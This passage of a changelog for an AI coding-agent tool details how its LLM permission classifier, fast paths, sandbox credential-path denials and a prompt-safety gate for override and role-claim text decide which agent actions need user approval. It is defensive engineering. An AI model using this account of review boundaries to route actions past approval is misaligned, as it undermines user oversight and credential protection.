  Runtime/PID outcome fence and an independent stop-client watchdog. A hung
  Runtime close or synchronously blocked daemon is reclaimed on Windows through
  exact creation-time process handles; forced unverified exits remain failures,
  and a concurrently started replacement owner is reported instead of
  presenting its profile as idle. POSIX refuses unsafe cached-PID escalation
  until a retained native process handle/supervisor is available (Issue 269).
- Auto[LLM] now deterministically admits structurally proven read-only
  PowerShell environment/version inspection, including safe sequential and
  pipeline stages with descriptor duplication, while arbitrary scripts,
  path-qualified executables, sensitive environment reads, effectful command
  DSL/actions, script blocks, and file redirects remain LLM-reviewed. Static
  admission now respects authenticated child constraints and review-only
  questions instead of treating a generated/truncated briefing as user
  authority. The classifier strictly dual-reads the previous standalone
  response protocol during rollout and exposes bounded stop/response/protocol/
  parse diagnostics through Runtime permission requests instead of presenting
  a response-contract failure as an LLM hazard decision. A valid, unambiguous
  classifier `decision` is now the sole verdict: malformed, missing, or
  contradictory `hazard` / `reason` fields are retained as `outputWarnings`
  without retrying, opening the circuit breaker, or overriding `allow|ask`.
  Recoverable tool-projection and direct-read-analyzer faults now use bounded,
  redacted fallback facts and continue through the LLM instead of immediately
  requesting user approval. Extension/provider exception bodies are omitted
  from Auto-mode logs and approval reasons in favor of a stable failure stage
  and exception category; all Auto-mode warnings are single-line, bounded, and
  unable to alter permission decisions if a host logger fails. The public
  `ClassifierDecision` allow branch retains its previous `hazard?: 'none'`
  source type while contradictory hazard values remain non-blocking warnings.
  Auto[LLM] now explicitly defaults to automatic review and `allow`; the
  classifier asks only for concrete credential reads, mutations to KodaX
  authorization controls, or direct system destruction/resource exhaustion.
  Ordinary project
  mutations, Git operations including stash, and normal global dependency
  install/uninstall/reinstall no longer require per-command root authorization
  by category. Historical Tier 0 matches are classifier facts in Auto[LLM]
  rather than a second approval gate, while explicit Auto[Rules] retains its
  legacy deterministic behavior. The Ink and classic REPL observers now yield
  before legacy confirmation and historical-denial checks, so a rejection
  recorded under Edits/Rules cannot override a later Auto[LLM] allow.
- Auto permission fast paths now preserve shell wildcard uncertainty for
  sensitive reads, route broad search selectors, indirect file lists,
  PowerShell path arrays/enumeration pipelines, and dynamic Git pathspecs to
  LLM review, validate legacy/new Git-config regexp and URL forms including
  accepted option abbreviations, and refuse deterministic mutations based on
  truncated current-user intent. Git-grep options capable of launching a pager
  or external grep, or of expanding reads to untracked/no-index files, no
  longer use the read-only fast path. Directory/implicit content searches and
  unscoped Git patch output (including line-log targets, short-option clusters,
  and merge-diff modes) are LLM-reviewed, while exact file reads and
  metadata-only commands such as `git show --stat` remain deterministic.
  Classifier-failure fallback can no longer re-admit protected, unresolved,
  partial, risky, or intent-constrained reviews; explicit PowerShell
  `-LiteralPath` reads retain literal semantics. Complete root-user denials of
  reading or shell execution are now consulted before the corresponding
  deterministic read-only fast paths. PowerShell `Environment` and `Variable`
  provider reads now account for cmdlet aliases, wildcard/provider-qualified
  selectors, `-Path`/`-LiteralPath`, and parameter ordering; `Get-Variable`/`gv`
  follows the same process-data rule. Pipeline binding, scoped PowerShell
  variables, Bash indirect expansion, arbitrary exact names, and literal
  wildcard names no longer bypass review; a small diagnostic-name allowlist
  keeps exact `Env:PATH`/`Variable:HOME` inspection deterministic across
  `Get-Item`/`Get-Variable` and aliases. Function, alias, certificate, registry,
  and provider-qualified reads remain LLM-reviewed, while literal quoted
  variable text is not mistaken for expansion. `Select-String` now distinguishes
  positional/named Pattern, Path, and InputObject operands, avoiding review of
  provider-shaped search text while retaining review for provider paths.
  Retained read/shell
  constraints are honored even when the
  current request was compacted, with English/Chinese constraint markers used
  only to route semantic judgment to the LLM. Clause-aware scope, exclusion,
  passive-denial, and subprocess restrictions route to LLM judgment without
  confusing operation filenames or unrelated topics for constraints.
  Long-request compaction preserves constraint-centered slices, while its
  broader retention anchors are not treated as semantic authorization evidence.
  Multi-clause restrictions no longer get erased by an unrelated mutation-only
  clause, and `read-only` is distinguished from `read only <target>`.
  Copy/delete/move/rename fast paths now require direct action-to-target
  binding; exclusion-shaped or ambiguous authority is decided by Auto[LLM],
  whose `allow` verdict still avoids user approval. Unquoted physical
  line boundaries are now parsed as complete command sequences and active
  command substitution cannot hide inside quoted read arguments. Git signature
  verification shares one indirect-execution rule across every read fast path,
  and the default Coding `Runner.run()` substrate preserves authenticated
  structured permission intent through tool guardrails.

- Standalone Bun binaries now let only the bootstrap own CLI startup, avoiding
  duplicate command execution and startup-time Actor ownership conflicts. The
  host-target binary build now rejects artifacts that emit more than one A2A
  document.
- REPL Session IDs are collision-resistant under concurrent startup. Standalone
  JavaScript children, bundled Skill tools, shell probes, and project-local LSPs
  now use explicit interpreter ownership; Windows programmable commands use
  portable module URLs with visible diagnostics, and Runtime bundles resolve
  the constructed-handler sidecar from their published layout. Final-waiter
  shell-probe cancellation now completes bounded process-tree cleanup before
  returning for cancellation, timeout, and output overflow. Windows fallback
  termination verifies the pre-snapshotted root and every descendant by process
  creation identity in both Agent and LLM launch paths, with CIM/WMI/WMIC
  snapshot fallback when the native helper is unavailable.
- `list_dispatchable_agents` no longer falls back to native/constructed Agents
  in an opted-in Runtime Worker: the Worker bundle now owns A2A discovery,
  registration, execution, reconciliation, and shutdown.
- Runtime finalization, Stop, close, and recovery now preserve authoritative
  terminal state even when executor results or Actor snapshot writes are late
  or lost. Extension finalizers are bounded and stale successful Session
  snapshots clear prior crash metadata.
- Strict transcript/history reads are deadline- and cancellation-aware,
  read main and sidecar bytes from one immutable boundary, fail closed on
  corruption/version drift/resync, and cannot migrate or recover legacy
  Sessions as a side effect of observation.
- Legacy conversation reconstruction now rejects conflicting or dangling clone
  provenance, uses linear retained-suffix and multi-compaction traversal,
  follows exact retained lineage across inactive compaction epochs only when
  an append-ordered explicit provenance path proves it,
  carries proven pre-compaction history across forks without expanding active
  model context, and writes truthful archived-rewind audit markers. Bounded
  issue summaries and snapshot/page accounting keep corrupt identifiers and
  concurrent materialization inside transport and resource limits.
- Cold Runtime Session reads now share one immutable metadata/transcript
  capture and one revision materialization across observation, fresh paging,
  and search. A process-level canonical Session locator avoids repeated project
  scans, revision-bound cursors stay source-free, and read-only Session APIs no
  longer allocate or persist Runtime events.
- Strict Session locator authority now requires a complete traversal and is
  fenced by a durable cross-process topology epoch, so a later same-ID candidate
  in an existing project invalidates positive caches and fails closed instead
  of returning the wrong Session. Legacy v0.7.78 writers are detected through
  their existing per-Session lock queue; stable list traversals collect one
  such witness plus active lock identity per ID, so unrelated writes do not
  invalidate the entire index and a writer spanning the traversal cannot hide.
  Inaccessible project candidates now make strict discovery fail closed. A
  macOS-primary benchmark uses pre-existing JSONL and a fresh Runtime to compare
  direct, list-indexed, and post-unrelated-write tiny-Session observation at 10
  and 10,000 projects, including temporary materialization cleanup.
- The first full reconciliation of an upgraded v0.7.78 Session now reuses the
  exact persisted active context instead of cloning historical replay siblings.
  No-input reconciliation is idempotent, while an intentional same-content new
  query remains a distinct entry; direct and paged transcript order stays exact.
- Durable-island recovery preserves parent-before-child append order and
  compaction clone provenance. Archive/unarchive also rejects orphan modern or
  legacy sidecar collisions instead of pairing unrelated history.
- First-run setup now distinguishes configured provider/model metadata from a
  usable provider credential, so missing credentials show actionable
  environment guidance instead of reopening the metadata wizard.
- Windows ASRT execution now prepares a protected content-addressed runner
  outside user-level global npm directories and validates the complete account
  state before launching the workspace sandbox.
- Parallel quality-strategy admission now conflicts only with a competing
  admission for the same parent Actor state, rather than unrelated child or
  progress updates.
- TodoList content and labels now preserve the query and UI locale language
  continuity (Issue 258).
- Runtime teardown now preserves indeterminate lifecycle facts instead of
  reporting false success: Windows process-tree cleanup returns `unknown` when
  spawn-time root identity, snapshots, or descendant termination cannot be
  verified, uses identity-checked process handles instead of bare-PID `taskkill`,
  and detects late descendants from every captured ancestry seed. Managed child
  records fence PID/owner reuse and preserve recognizable legacy records for
  manual recovery, while MCP close retains its host-exit hook and cleanup record
  and reports a typed incomplete result for retry. Actor shutdown
  aborts local work immediately, clears owner
  and nonterminal turns atomically, and fences both pre-existing settlement
  hangs and final-write failures. All explicit cancellation entry points start
  the bounded Actor-finalization grace while healthy children remain unbounded.
- Runtime event-bus poison clears coalescing buffers and makes repeated close
  failures stable while still completing local teardown. Determinate failures
  retain one bounded batch behind a backpressure latch instead of growing or
  retrying every 50 ms; direct durable failures do not poison an empty queue,
  and an oversized emission is synchronously persisted outside the retry queue,
  propagating failure without retaining the payload. Cross-process status
  locks atomically publish complete records, use unique bakery claims plus exact
  tokens for crash recovery, compare OS-derived process-start identity, use
  monotonic deadlines, fail closed on malformed ownership, and recover stale
  reclaim/cleanup gates. Unsupported hard-link publication falls back to
  exclusive creation, and persistent candidate cleanup is bounded per lock
  family. Daemon cancellation now releases Actor waiters from inline, Worker,
  and daemon clients without aborting durable Run state; cancel/ack control
  frames obey the request-ID fence and cannot acknowledge unfinished requests.
  Daemon startup cleanup also surfaces an indeterminate process-tree outcome
  instead of treating an already-exited root as proof of descendant cleanup.
- A2A integration watching now ignores unchanged content revisions, preventing
  repeated false `hot-reloaded` notices and their unnecessary root-TUI render.
  Explicit manual reload still repairs missing registrations and retries
  transient discovery failures without requiring a file rewrite.

### Performance

- REPL recent-session page loading is bounded so large session histories do
  not stall the picker or resume flow.
- Workspace git inspection during REPL startup is parallelized, reducing
  time to first prompt on large repositories.

## [0.7.78] - 2026-07-29

### Added

- **Evidence-Gated Background Skill Learning (FEATURE_263).** Completed the
  Memory-first learning loop with durable non-blocking review, immutable
  project-scoped learned Skill revisions, canonical record/fingerprint-gated
  discovery, exact-use outcome attribution, bounded three-use canaries,
  independently verified project activation, and full `/learn`/Runtime Learning
  Center controls. Protected/formal Skills, global promotion, and Extension
  authoring remain explicit user actions.
- **Complete First-Run Split Configuration (FEATURE_276).** `kodax setup`,
  first-run onboarding, and `--custom` now create and validate the core, MCP,
  Extensions, and A2A active files plus annotated templates without
  overwriting existing configuration or collecting secrets. Legacy integration
  declarations are preserved and all cooperating writers share the same
  lock/revision boundary.
- **Standalone Sandbox SDK.** Added the `@kodax-ai/kodax/sandbox` subpath with
  typed capability, doctor, setup/activation guidance, and explicit
  host-owned contained command execution. The generic API reports structured
  unavailability and never silently executes without containment.
- Added read-only `/sandbox` diagnostics and optional `tool.sandbox` Runtime
  events. Ordinary startup, history, and command cards remain quiet.

### Changed

- **Intent-Aligned Auto[LLM] Permission and ASRT Execution (FEATURE_277).**
  Precisely modeled ordinary reads and workspace/system-temp mutations bypass
  classifier latency independently of sandbox readiness. Other actions are
  reviewed against bounded user intent and exact side effects; approval timeout
  cancels only the current operation. ASRT is optional execution containment,
  not permission authority, and admitted commands reuse a workspace-scoped
  session instead of paying initialization/reset per command.
- The published bundle now exposes 12 SDK subpaths (13 entries including the
  root), adding `/sandbox`; README, README_CN, the SDK embedder guide, and
  `kodax_manual` describe the same surface.

### Fixed

- The v0.7.78 semantic release gates now use frozen, resumable current-policy
  runners instead of absent or historical fixtures. F263 revision
  `f263-v0.7.78.4` freezes production learning-review and downstream action
  bytes; F277 revision `f277-v0.7.78.4` freezes the intent-aligned permission
  prompt and exact action evidence. Both default to zero provider calls, require
  explicit owner authorization plus a feature-specific generation flag, keep
  raw/blind-review evidence outside the repository, and fail closed on
  case/prompt/scorer drift.
- The first F263 paid validity pilot (`f263-v0.7.78.2`) correctly stopped after
  4 calls: three outputs were rejected by the production normalizer and neither
  positive sample produced a project canary. The production report contract now
  requires `memoryPlan` and `capabilityDecision` as top-level siblings and
  states the governed `requiresApproval=true` invariant without weakening the
  strict normalizer or changing Skill admission policy.
- The subsequent F263 `.3` safety panel found no credible high-severity harm:
  no negative case normalized to a project canary and all nine positive raw
  decisions selected `project_canary`. It also exposed one systematic utility
  mismatch: six human-readable Skill names failed the production slug
  invariant, leaving only 3/9 normalized positive canaries. The production
  prompt/tool schema now state the existing lowercase hyphenated-slug and
  64-character constraints. Strict validation, evidence thresholds, scope,
  canary admission, and promotion policy remain unchanged; downstream expansion
  stopped and fresh `.4` revisions bind the corrected bytes to one exact
  candidate.
- Runtime Actor trees now persist one exclusive owner per Session. A second live
  Runtime can no longer recover another Runtime's active child turns; stale
  controllers self-fence on CAS conflict, physically abort local executors,
  refresh durable state and mailbox events, and expose actionable
  `actor_owner_conflict` diagnostics. Runtime close and Session deletion release
  ownership safely; archive/delete retain the owner through the filesystem
  operation, while deletion quiesces executors before removing the file and
  then performs a no-write local dispose. A per-Session gate closes Run/Agent
  admission races with archive/delete, and SA root Runs now claim the same
  owner fence. A Runtime-scoped loopback identity challenge now distinguishes
  a live owner from an unrelated process that reused its PID: refused or
  completed mismatched challenges prove stale, while timeouts and unknown
  failures stay fail-closed. Legacy snapshots without an identity challenge
  remain fail-closed because their live owner cannot be proven. Archived Sessions
  reject Run/Agent execution and in-place mutation until unarchived, and
  archived Actor CAS writes stay in the exact archived file instead of
  recreating an active duplicate. Failed deletion retains its authoritative
  snapshot and owner for retry, paired archive moves roll back on sidecar
  failure, and external task aborts cover queued, preflight, pending, and
  ambiguous start admission with a prompt `AbortSignal`, A2A request-level
  propagation, retained per-Agent start ordering, coalesced reference-aware
  cancellation, and bounded Actor-turn convergence.
  Actor recovery preflight is byte-for-byte read-only, and Session recovery re-reads under the
  cross-process lock without bypassing Actor ownership or moving archived data.
  Stale full Session saves cannot replace the Actor CAS sub-snapshot, and all
  full rewrites/island maintenance retain the resolved archived path.
  Failed initialization releases a newly claimed fence and supports
  same-instance/double-failure cleanup. Raw maintenance and retention reject
  owned/non-terminal trees, complete Session file sets delete through
  rollback-safe staging, and cross-process append revalidates and merges stale
  watermarks plus same-length identity rewrites on the exact resolved path.
  Runtime client, Worker, hosted-daemon, host, lease, and executor-plane close
  attempts are shared and retryable after partial failure or timeout.
- SDK daemon auto-start accepts an opt-in `daemonOrphanExitMs` lifecycle
  contract. A newly ready daemon arms bootstrap grace even if its launching
  client crashes before initialize; attach cancels the timer, and loss of the
  final logical client starts a fresh full grace period. Other clients cancel
  it, governed active work defers shutdown until terminal/idle state, and only
  then does the daemon release its endpoint, state, and owner lock. Ordinary
  CLI persistent daemons remain unchanged. The dedicated
  `daemonOrphanExit:1` capability reports that the current host actually has
  the policy enabled, and both Runtime facades safely replace an idle
  persistent owner before relying on it.
- Invalid optional MCP, A2A, or Extension configuration no longer aborts
  daemon cold start. Each domain fails independently to a visible safe-empty
  state, retains last-known-good data on later invalid edits, watches legacy
  `config.json` fallbacks, and hot-recovers without mutating user files.
  Detached bootstrap output is retained in continuously bounded logs, and the
  daemon advertises the versioned `integrationConfigResilience` contract.
- Auto[LLM] now retries classifier timeout/provider/contract failures once,
  enforces its deadline even when a provider ignores cancellation, exposes
  bounded prompt-size and TTFT phase diagnostics, and then degrades at the
  Accept-edits boundary without switching to Auto[rules]. Classifier
  concerns request user confirmation instead of hard-blocking. Exact,
  explicitly requested workspace copy/move/rename/delete/write/create shell
  calls can proceed without an LLM round trip independently of sandbox
  readiness. ASRT adds optional execution containment; unavailable or
  pre-launch-failed local containment falls back to the ordinary path without
  another classifier/approval. Admitted commands in one workspace reuse a
  long-lived ASRT session, so session-level initialization/reset is not paid
  on every command. Normal history stays quiet, while `/sandbox` provides
  explicit diagnostics and SDK hosts can opt into structured events.
- Runtime Auto capability negotiation now requires
  `runtimeAutoModeGuardrail:4` for daemon auto-start and consistently reports
  `fallbackPersistsEngine:false` from embedded, Worker, and daemon hosts. An
  idle v3 daemon is replaced before a v0.7.78 client relies on the
  intent-preserving, non-Rules fallback contract.
- The built-in A2A listener now rejects explicit Fetch-blocked ports and
  retries ephemeral allocation when the operating system selects one, so a
  successfully returned loopback URL is usable by Fetch-compatible clients.
- `/learn promote` now has dedicated help, strict `--scope user` validation,
  name/slug/capability-ID disambiguation, command completion, v2 learned-record
  transport across inline/Worker/daemon, reviewed `ready` or `active_learned`
  admission, and atomic non-overwriting publication with symlink/junction
  containment and idempotent repeat behavior.
- Learned Skill canaries now remain in `testing` until all three exact-revision
  outcomes settle, activate only with at least one independently verified
  success, and revalidate revision/fingerprint inside the second locked
  invocation mutation. A stale artifact identity cannot consume a canary slot
  or be attributed to the current revision.
- Root AMA runs now execute the same governed MemorySession lifecycle as the
  standard Agent path. The new root-only `memory_intent` signal binds an exact
  current-user quote, distinguishes captured/queued/applied states, retains
  durable review evidence, serializes review drains, and prevents generated
  resume text or child Agents from authorizing Memory writes. Explicit
  host-bound intent survives a later root cancellation without preserving
  observations or lessons from the cancelled task; foreground completion still
  stops at durable review enqueue rather than waiting for semantic review.
- Workspace ASRT shell containment now denies reads from sensitive home
  credential paths and the complete resolved agent home. Home-local executable
  search paths cannot carve access back into a denied subtree; ordinary
  external reads, workspace/temp writes, bootstrap execution, and the existing
  network policy remain unchanged.
- Edit mode no longer sends already-allowed static Skill loading to the client
  permission broker, and Plan mode can load static instructions without
  authorizing their later side effects. Dynamic Skill commands are blocked
  live in Plan and otherwise require an explicit host-controlled executor;
  protected writes and non-read-only shell actions keep their normal gates.
- Managed Workflow Actor waits no longer turn the Actor API's internal
  30-second polling window into a misleading `undefinedms` failure when the
  workflow has no explicit timeout. Explicit deadlines remain authoritative,
  and terminal Actor output closes event-delivery races.
- The resume Session picker now renders stored timestamps in the host's local
  timezone instead of presenting UTC values without a timezone marker.
- The Windows ordinary-query regression now gives temporary recursive removal
  a bounded native retry window for the intentionally non-blocking governed
  Memory review queue. The release gate no longer fails with transient
  `ENOTEMPTY`, without making background review block foreground completion.

## [0.7.77] - 2026-07-27

> Released as Git tag `v0.7.77`, GitHub Release, and
> `@kodax-ai/kodax@0.7.77` on npm. Frozen F274/F275 paid evaluation completed
> with a joint owner `SHIP` decision; no unmeasured task-effect, token, or
> latency improvement is claimed.

### Added

- **Host-configurable Shell Execution Contract.** Runtime callers can persist a
  JSON-only `shellExecution` policy per Session or override it per Run,
  selecting pwsh, Windows PowerShell, cmd, bash, zsh, or an explicit Git Bash
  path. Configured runs resolve a credential-filtered environment through the
  selected shell in the effective cwd, cache it by contract/cwd with strict
  TTL or `refreshToken` invalidation, and execute through that same explicit
  interpreter. Native child Agents and AMA deterministic evaluators inherit
  the policy, command grants bind to its hash, and unconfigured callers retain
  legacy shell behavior.
- **Pattern-aware adaptive AMA (FEATURE_274).** Ordinary AMA now shares one
  six-pattern problem-solving catalog with Workflow semantics while continuing
  to execute through the existing Runtime-owned Actor/Turn tree. Optional
  `quality_strategy` metadata distinguishes coverage, replication, opposition,
  filtering, judging, and challenge intent; Runtime derives a bounded,
  fact-only `PatternTrace`, and the existing Sidecar remains the sole
  terminal-answer quality adjudicator. Pattern presence does not activate a
  Workflow, force a child, create a fixed topology, or add another verifier.
- **Governed event-triggered memory intervention (FEATURE_275).** Tool failure,
  verification failure, and durably committed compaction can rebuild a closed,
  prompt-safe candidate set before the next Action-LLM request.
  `MemorySession.intervene()` performs deterministic exact selection by
  default; an in-process host may opt into the bounded `memoryRecallRunner` or
  `createCodingMemoryInterventionRunner()`. F228 remains the only durable
  memory authority, daemon DTOs reject the function binding, and malformed,
  unknown, stale, timed-out, or cancelled selector output fails silent.
- **Public Kimi K3 route.** The `kimi` provider now exposes `kimi-k3` with a
  1,048,576-token context and the same K3 reasoning profile used by Kimi Code,
  while preserving `kimi-k2.7-code` as the public default.

### Fixed

- Daemon startup now waits for the matching healthy owner state to publish
  `status: ready` before returning, unrefing its child, or attaching a
  concurrent CLI/SDK starter. Owned, competing, and pre-existing-owner paths
  share the same bounded, cancellable identity fence, preventing successful
  starts or SDK connections from observing a stale `starting` state.
- Missing local files referenced by historical image blocks no longer poison every later
  Provider request. Anthropic-compatible user/tool-result images and OpenAI-compatible user
  images now degrade only `ENOENT`/`ENOTDIR` to a path-free text marker; unrelated filesystem
  errors remain visible. OpenAI-compatible tool-result image blocks also use path-free
  missing/unsupported markers instead of serializing absolute local paths.
- Added stable, opaque Provider prompt-cache affinity for Kimi Code and other
  verified endpoints. AMA/SA root requests reuse one logical-context key across
  runs, retries, fallback, resume, and compaction; child Agents use stable
  canonical-path keys isolated from their parent and physical worker Sessions.
  Kimi Code lowers it to Anthropic-compatible `metadata.user_id`, public Kimi
  and official OpenAI use `prompt_cache_key`, strict compatible gateways remain
  opt-in, and the effective SDK/run-scoped/env `disablePromptCache` policy
  removes all cache-routing metadata. Cache diagnostics expose only a separate
  hash of an affinity key actually supported by the configured wire, never the
  key or logical identity itself.
- Preserved official CLI cache usage end to end. Codex CLI
  `cached_input_tokens` / `cache_write_input_tokens` and Gemini CLI
  `stats.cached` now survive the JSONL parser, pseudo-ACP, normalized Provider
  usage, and Runtime diagnostics. Explicit Provider zero remains `0`; missing
  or invalid fields remain absent, and input totals are never recomputed by
  adding cache breakdowns. The bridge now also keeps generated ACP IDs separate
  from native Codex/Gemini session IDs: first prompts start fresh, only
  CLI-reported native IDs may be resumed, stateless calls cannot share a
  process-global session, failed/disconnected pseudo transports are recreated,
  pending handshakes and later transport deaths are invalidated for reconnect,
  and missing or non-zero-exit CLI completion fails visibly even when a
  successful completion event was reported earlier. Default aborts remain
  user cancellation, while hard/idle timeout abort reasons propagate into the
  normal retry and failure path instead of becoming an empty success. The
  configured CLI executor timeout is now enforced through process-tree
  termination, including after a CLI reports success but never exits; native
  ACP prompts also stop waiting at the caller deadline even if a server ignores
  the best-effort cancel request.
- Hardened the Shell Execution Contract after adversarial review: configured
  commands now deny credentials for every registered Provider, preserve a
  Session contract when a Run context contains explicit `undefined`, rebuild
  Windows Registry environments without stale `%PATH%` or tool-manager
  variables, reject unsupported PowerShell profile/command switches, remove
  `NODE_OPTIONS` before probing, honor explicit environment denies, and avoid
  cmd-only hints under PowerShell or Git Bash. Last-waiter cancellation now
  terminates an in-flight profile probe without interrupting shared waiters.
  A targeted Windows CI gate covers the cross-platform shell paths.
- Rebuilt the supplied v0.7.77 package from the cache-stability fix and added
  an end-to-end AMA automatic-compaction regression. Before and after
  compaction, native and legacy Providers now prove the Skills addendum and
  selected Skill are injected exactly once per Worker request, remain visible
  to context-budget diagnostics, and never persist in compactable history.
- Repaired nested `agent-turn:` evidence fence sanitization so downstream child
  briefings use invisible zero-width separators instead of visible mojibake.
- Made queued Runtime interrupt validation atomic at the batch boundary:
  invalid artifacts now leave every accepted prompt queued and append no
  partial user-message batch.
- Extended governed-memory prompt safety to qualified credential sentences and
  advanced its frozen evidence fingerprint to cover the policy identity and
  renderer limits.
- Aligned terminal contracts by emitting `onComplete` on iteration exhaustion
  and deriving live-turn status from the final result; pattern-disposition
  output Schema now enforces the parser's exclusive target forms.
- Taught the workflow structured-output validator to honor `oneOf`
  (exactly-one-variant), so Schemas using it—including the
  pattern-disposition envelope—are genuinely validated instead of silently
  passing, and remain legal for workflow `outputSchema` declarations.
- Completed the Runtime diagnostics query contract for reconnecting hosts.
  Budget, tool-exposure, compaction-skip, and provider-cache diagnostics now
  carry stable logical `contextId` / `parentContextId` identity while retaining
  isolated child transcript Sessions. Inline and daemon Runtime services expose
  `latestProviderCacheDiagnostic(filter?)`; root defaults and child
  Session/Agent isolation share the same strict matching semantics. Existing
  hash-only request-envelope, ephemeral-suffix, retry/fallback/repair, and
  compaction diagnostics remain intact.
- Extended prompt-cache and context-budget diagnostics to the SA substrate used
  by Runtime child Agents, including retries, non-streaming fallback, workflow
  digest, structured-output repair, and compaction summary requests. Diagnostics
  now hash the Provider-visible projection, endpoint query, ephemeral suffix,
  and complete request envelope while reporting only Provider-supplied cache
  usage. Child cache controls preserve explicit `true` and `false` end to end.
- Kept the default child leading System prefix stable while restoring the
  documented full specialist System override and write-child project mutation
  rules. Runtime Actor children retain recursive AMA collaboration semantics on
  the direct Runner substrate; actorless and protocol-owned Workflow leaves
  remain SA with collaboration tools and guidance hidden.
- Separated Runtime Actor mailbox routing and logical context identity from
  each child's isolated transcript session so child-to-grandchild wait/output
  delivery completes reliably, follow-up diagnostics keep stable identities,
  and synthetic digest/repair calls cannot advance canonical history revisions.
- Enforced specialist tool ceilings across descendants, Actor provider ceilings
  across final routing and fallback, and model-visible collaboration guidance
  against the final tool table. Direct children no longer see an unbound
  `run_workflow`; actorless Workflow leaves execute under their admitted Actor
  capability snapshot and use collision-free Actor paths for diagnostics.
- Kept canonical context revisions aligned with core-owned compaction storage:
  a post-commit observer failure is diagnosed but can no longer roll back an
  already persisted history replacement.
- Added root/child diagnostic identity and filtering so child physical requests
  remain observable without replacing the default root result returned by
  `context.budget.get`; diagnostics remain fully fail-open and never expose
  prompt text.
- Corrected the paid prompt-cache lifetime probe to send the canonical
  `input_schema` tool field.
- Closed the Runtime interrupt finalization race in both managed and ordinary
  coding runs. A terminal candidate now closes active-run input admission
  atomically, drains every interrupt accepted before that boundary into the
  same Run, reserves a continuation model turn even at the configured iteration
  limit, and reopens admission only when another model turn is guaranteed.
  A fixed internal continuation allowance now preserves an absolute Run bound
  when a client keeps submitting input without exceeding an admitted manifest's
  `maxIterations` governance cap.
  Idle-yield waiting reopens admission, while failure, cancellation, and
  terminal cleanup close it before asynchronous teardown. Ordinary coding also
  rotates live-turn attribution for each queued prompt and commits a COMPLETE
  assistant response before any accepted continuation input. REPL follow-ups
  retain their existing fresh-round ownership.
- Deduplicated built-in default models across `/model` completion, provider
  metadata, and SDK capability listings while preserving default-first order
  and per-model capability overrides.
- Resolved provider-only Auto LLM admission before preflight by materializing
  the provider's static default model when one is available; custom providers
  without a resolvable default retain the existing actionable error.
- Stabilized Anthropic-compatible prompt-cache prefixes across managed role
  turns, exported cache diagnostic events, and added a focused
  `probe:prompt-cache` operator command. Marking the latest user turn seeds the
  next request but can add cache-write overhead to isolated one-shot requests;
  those callers can set `disablePromptCache:true` or
  `KODAX_DISABLE_PROMPT_CACHE=1`.
- Removed the Session-specific scratch path from AMA's stable System prompt.
  Repository, memory, routing, Session, and live Actor facts now travel in the
  request-only tail after Provider cache breakpoints, so equivalent first
  requests from fresh Sessions share the same System/tools/messages prefix and
  emit an `ephemeralSuffixHash`. Qwen Anthropic-compatible usage continues to
  count uncached input plus cache creation/read input as total input. OpenAI-
  compatible Providers merge the suffix into the final wire user turn to avoid
  rejected `user,user` adjacency; runtime-registered Providers that do not
  declare native suffix support receive a request-only message fallback.
- Expanded the governed-memory prompt-safety gate for common override/reset
  variants, role-mode claims, self-closing role tags, and sentence-shaped
  credentials. Checks now run against Unicode-normalized,
  formatting-separated, and formatting-joined text; ordinary credential status
  statements remain usable, and persistence shares the same secret predicate;
  prompt-cache diagnostics now document their existing `contextDiagnostics`
  gate.
- Made abort completion emission exactly-once and kept governed memory
  intervention delivery ordered with terminal cleanup.

### Documentation

- Updated the English/Chinese READMEs, current PRD/HLD/DD baselines, ADR
  addendum, SDK embedder guide, feature and issue trackers, release guide,
  package READMEs, and `kodax_manual` for the v0.7.77 candidate. Added focused
  Issues 212–214 regression guides for terminal/schema/memory hardening,
  compaction-safe managed context, and the Shell Execution Contract.

### Verification

- Added deterministic F274/F275 experiment-contract, pattern/trace,
  Sidecar-alignment, prompt-safety, candidate-admission, intervention-ordering,
  Runtime interrupt, structured-output, real auto-compaction, and
  cross-platform Shell Execution Contract regressions. A dedicated Windows CI
  job exercises pwsh, Windows PowerShell, cmd, Registry environment refresh,
  and Git Bash behavior.
- Completed the owner-authorized frozen paid gate against clean commit
  `25d5521e`: F274 revision `f274-v0.7.77.6` used 96 Layer 2 calls plus 40
  Layer 3 calls, kept candidate simple tasks solo in 6/6 cells, produced zero
  accidental Workflow activation, and received blinded `recommend-ship`
  reviews; F275 revision `f275-v0.7.77.3` completed its 16-call pilot with B/C
  compatibility preservation at 4/4 versus control 1/2 and exact-empty
  selector output in all 4/4 selector calls (including 2/2 negative controls).
  The joint decision is `SHIP`. F275 semantic selection remains experimental
  and host opt-in, and the 144-call task-effect/default-on validation was
  intentionally not run.

## [0.7.76] - 2026-07-25

> Git tag and GitHub Release are published by the release workflow. npm
> publication remains the operator's final manual step.

### Changed

- **Kimi Code defaults to the official K3 256K route.** The `kimi-code`
  provider now defaults to `k3-256k` and sends that exact upstream model ID.
  `kimi-for-coding` remains selectable for K2.7 Code, alongside
  `kimi-for-coding-highspeed` and the 1M `k3` tier. K3 now exposes the
  documented `low` / `high` / `max` reasoning levels with `high` as default;
  media metadata marks `k3-256k` as image-capable but not video-capable, and
  nominal subscription accounting reflects the 1M `k3` route's roughly 2x
  quota consumption.

### Verification

- Added direct live-wire smoke coverage for all four Kimi Code subscription
  routes: `k3-256k`, `k3`, `kimi-for-coding`, and
  `kimi-for-coding-highspeed`.

## [0.7.75] - 2026-07-24

> The npm package was published manually. The `v0.7.75` Git tag and GitHub
> Release were skipped; the binary-release changes roll into `v0.7.76`.

### Changed

- **Exact audited npm candidate bytes.** The release script now packs first,
  audits the generated Sidecar prompt and budget bridge, and publishes that
  exact tarball so SDK validation and registry publication cannot drift.
- **Windows GUI background-process hardening.** Runtime
  Worker-reachable non-interactive child processes now request hidden Windows
  consoles across memory/Git metadata, provider CLI and ACP, LSP, clipboard,
  worktree, review, extension-command, checkpoint, and sandbox paths. Explicit
  editor, terminal, and PTY interaction remains unchanged.
- **Published Runtime Worker audit and packaged-host regression.** The bundle
  build now audits statically identifiable child-process calls in the published
  Runtime Worker, and the packaged Electron daemon smoke runs 20 ordinary
  queries with a Win32 console-visibility probe. Packaged KodaX Space validation
  on Windows 10 and Windows 11 remains a non-blocking product follow-up; it does
  not gate the tag, package build, or npm publication.

### Fixed

- **Sidecar completion and Runtime terminal semantics.** Optional work offered
  after the current request is complete is accepted rather than reported as
  blocked; only clarification required to finish the current request remains
  blocked. Budget-approval state is emitted only for an eligible `revise`, and
  structured blocked codes and reasons survive live events, persistence,
  daemon round trips, and restart recovery.

### Documentation

- Updated the release guide, current architecture/design baselines, SDK
  embedder guidance, feature index, roadmap, issue tracker, English/Chinese
